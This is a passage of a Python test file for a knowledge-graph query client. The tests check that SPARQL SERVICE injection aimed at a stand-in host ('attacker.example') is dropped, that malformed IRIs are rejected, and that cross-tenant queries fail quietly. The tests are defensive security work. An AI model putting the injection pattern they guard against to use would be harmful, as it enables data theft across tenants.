    out = await p._resolve_uri_labels([{"x": SERVICE_INJECTION_VALUE}], DATA_GRAPH)

    # Nothing was sent at all (the only candidate was dropped), and if a future
    # change does send something, it must carry no SERVICE and no injected text.
    for sparql in seen:
        assert "SERVICE" not in sparql.upper(), sparql
        assert "attacker.example" not in sparql, sparql
    # Dropping it costs the value a LABEL, not the row: `_format_answer`'s
    # display step is `uri_labels.get(value, value)`, so an absent key renders
    # the raw value exactly as it does for any other unlabelled string.
    assert SERVICE_INJECTION_VALUE not in out


def test_interpolatable_iri_uses_the_grammar_not_a_payload_blocklist():
    from cograph_client.nlp.pipeline import _is_interpolatable_iri

    assert _is_interpolatable_iri("https://graph.onta.sh/entities/Film/x")
    assert not _is_interpolatable_iri("")
    # Every codepoint SPARQL's IRIREF production excludes, one at a time.
    for bad in '<>"{}|^`\\':
        assert not _is_interpolatable_iri(f"https://graph.onta.sh/entities/a{bad}b"), bad
    for bad in (" ", "\t", "\n", "\r", "\x00", "\x1f"):
        assert not _is_interpolatable_iri(f"https://graph.onta.sh/entities/a{bad}b")


@pytest.mark.asyncio
async def test_agent_degrades_in_contract_instead_of_raising_a_500():
    """``/agent`` has no route-level boundary handler, so this one degrades here.

    ``planner.handle`` does not catch, and ``api/app.py`` registers no handler
    for :class:`CrossTenantQueryError`, so letting it escape would be a bare 500
    that also breaks the documented ``{kind: answer|clarify|plan|result}``
    contract and loses the conversation turn.
    """
    from unittest.mock import patch

    from cograph_client.agent.capabilities.query import QueryCapability

    ctx = AsyncMock()
    ctx.tenant_id = TENANT
    ctx.kg_name = ""
    ctx.neptune = AsyncMock()
    ctx.anthropic_key = "invented-anthropic-key"
    ctx.extras = {}

    with patch(
        "cograph_client.nlp.pipeline.NLQueryPipeline.ask",
        side_effect=CrossTenantQueryError("nope"),
    ):
        out = await QueryCapability().answer(ctx, "how many things")

    assert out.get("kind") in (None, "answer")
    assert not out["sparql"]
    assert out["rows"] == []
    # Nothing about the refused query is echoed back to the caller.
    assert VICTIM_GRAPH not in out["answer"]
